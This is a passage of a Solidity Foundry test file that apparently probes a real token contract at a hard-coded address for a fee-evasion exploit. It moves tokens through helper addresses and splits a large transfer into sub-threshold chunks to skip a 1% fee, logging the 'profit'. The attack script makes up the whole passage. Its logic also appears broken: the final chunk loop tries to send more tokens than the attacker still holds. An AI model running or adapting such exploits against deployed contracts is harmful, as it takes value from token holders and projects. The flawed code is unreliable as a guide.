    function _CHARITY_FEE() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x5CB9B847FbA8aAdb8a943fE19C1cc8439d7e00C5;
    address attacker;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use deal to get tokens
        attacker = address(this);
        // Get some initial tokens to work with
        deal(TARGET, attacker, 1000 * 10**18);  // Assuming 18 decimals
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get initial balance
        uint256 initialAttackerBalance = IERC20(TARGET).balanceOf(attacker);
        console.log("Initial attacker balance:", initialAttackerBalance);

        // Create two helper addresses
        address helper1 = address(0x1001);
        address helper2 = address(0x1002);

        // Give helper1 some tokens from attacker
        uint256 testAmount = 50 * 10**18; // 50 tokens, below 100 threshold
        IERC20(TARGET).transfer(helper1, testAmount);

        // Check helper1's balance
        uint256 helper1Balance = IERC20(TARGET).balanceOf(helper1);
        console.log("Helper1 balance after transfer:", helper1Balance);

        // If no fees, helper1 should have exactly testAmount
        // With 1% fee, helper1 should have testAmount * 0.99 = 49.5 tokens
        // But due to rounding, might be different

        // Now transfer from helper1 to helper2
        vm.prank(helper1);
        IERC20(TARGET).transfer(helper2, helper1Balance);

        uint256 helper2Balance = IERC20(TARGET).balanceOf(helper2);
        console.log("Helper2 balance:", helper2Balance);

        // Transfer back to attacker
        vm.prank(helper2);
        IERC20(TARGET).transfer(attacker, helper2Balance);

        uint256 finalAttackerBalance = IERC20(TARGET).balanceOf(attacker);
        console.log("Final attacker balance:", finalAttackerBalance);

        // Calculate profit/loss
        int256 profit = int256(finalAttackerBalance) - int256(initialAttackerBalance);
        console.log("Profit (positive is good):", profit);

        // If profit > 0, we've exploited the fee rounding
        // Actually, profit should be negative due to fees in normal case
        // If profit is less negative than expected (or positive), that's the exploit

        // Let's also test with amount just above threshold
        console.log("\nTesting with amount above threshold:");
        address helper3 = address(0x1003);
        uint256 largeAmount = 200 * 10**18; // 200 tokens, above threshold

        uint256 beforeLarge = IERC20(TARGET).balanceOf(attacker);
        IERC20(TARGET).transfer(helper3, largeAmount);
        uint256 helper3Balance = IERC20(TARGET).balanceOf(helper3);
        console.log("Large transfer - helper3 received:", helper3Balance);
        console.log("Expected with 1% fee: ", largeAmount * 99 / 100);

        // The key insight: for small amounts (< 100 tokens), no fees are taken
        // This means you can break large transfers into many small transfers to avoid fees
        console.log("\nExploit: Break large transfer into small chunks:");
        uint256 chunkSize = 50 * 10**18; // 50 tokens
        uint256 totalToTransfer = 1000 * 10**18; // 1000 tokens
        uint256 chunks = totalToTransfer / chunkSize;

        address helper4 = address(0x1004);
        uint256 attackerStart = IERC20(TARGET).balanceOf(attacker);

        // Transfer in chunks
        for (uint256 i = 0; i < chunks; i++) {
            IERC20(TARGET).transfer(helper4, chunkSize);
        }

        uint256 helper4Received = IERC20(TARGET).balanceOf(helper4);
        console.log("Helper4 received via chunks:", helper4Received);
        console.log("Expected with fees (1%):", totalToTransfer * 99 / 100);
        console.log("Difference (profit from avoiding fees):", helper4Received - (totalToTransfer * 99 / 100));
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

